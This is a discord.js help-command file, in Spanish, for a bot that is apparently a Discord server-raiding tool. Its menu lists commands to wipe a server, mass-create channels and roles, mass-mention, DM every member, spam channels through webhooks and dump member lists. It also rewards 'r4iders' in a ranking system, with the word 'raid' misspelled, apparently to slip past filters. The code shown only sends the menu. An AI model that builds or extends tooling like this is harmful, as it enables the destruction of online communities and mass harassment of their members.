const Discord = require("discord.js");
const db = require("megadb")
const prefix_db = new db.crearDB('prefix')


module.exports = {
    nombre: "help",
    alias: ["hp"],
    run: async (client, message, args) => {






      const embed = new Discord.MessageEmbed()
      .setAuthor(client.user.username, client.user.avatarURL())
      .setDescription("Servidor de soporte **[Aqui](https://discord.gg/pNcn5DpG83)**")
      .addField("🛡️ `|` Principal", "`aw!nuke` Elimina todo lo del servidor\n`aw!raid` Crea canales y hace muchas menciones \n`aw!auto` Elimina todo y crea canales \n`aw!roles` Crea infinidad de roles\n`aw!nick <valor>` Le cambie el nick a todas las personas\n`aw!mdall` Envia DM a todas las personas\n`aw!send <id>` Envia muchos mensajes a un canal en especifico\n`aw!raidhook (lento)` crea canales y envia mensajes por webhooks\n`aw!name-all` Cambia el nombre a todos los canales\n`aw!webhook` Envia muchos mensajes a todos los canales por webhook\n`aw!invite-info <link>` Ve la información de un servidor muy detallada\n`aw!info` Envia 2 archivos txt con la información del servidor incluyendo Miembros, canales y categorias")
      .addField("⚙️ `|` Personalizacion", "`aw!setmessage <valor>` Establece el mensaje que aparecera al r4idear\n`aw!setchannel <valor>` Establece el nombre del canal en el r4id\n`aw!setprefix <valor>` Establece un prefix\n`aw!setavatar <link>` Agrega un avatar personalizado\n`aw!setusername <valor>` Cambia el nombre del bot.")
      .addField("⬆ `|` Sistema de niveles", "`aw!check` Marca el servidor como r4ideado (debe ser mayor a 45 personas)\n`aw!profile` Ve tu perfil\n`aw!ranklist` Observa la lista de r4iders")
    .setTimestamp(new Date())
    .setFooter("Made by Awekening")
    .setThumbnail(client.user.displayAvatarURL())
    .setColor("RED")










message.channel.send(embed)
}
}
